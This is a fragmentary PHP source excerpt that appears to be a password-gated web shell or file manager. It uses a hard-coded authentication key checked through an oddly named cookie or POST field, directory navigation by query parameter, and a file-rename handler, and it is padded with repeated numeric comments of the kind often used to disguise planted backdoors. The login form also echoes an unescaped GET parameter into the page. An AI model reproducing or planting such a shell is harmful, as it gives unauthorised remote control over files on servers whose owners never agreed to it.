...
$auth_key = "3b9b687e2cbd3728b8e075efc40d6e9f";
...
$pass = false;
if (isset($_COOKIE['pw_name_38361'])) {
    if(($_COOKIE['pw_name_38361']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_38361'])) {
        if(($_POST['pw_name_38361']) == $auth_key) {
            setcookie("pw_name_38361", $_POST['pw_name_38361']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_38361' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1726014995591678 1726014995539496 1726014995192089 1726014995923582
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1726014995591678 1726014995539496 1726014995192089 1726014995923582
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1726014995591678 1726014995539496 1726014995192089 1726014995923582
            $name = PATH . "/" . $_GET['r'];
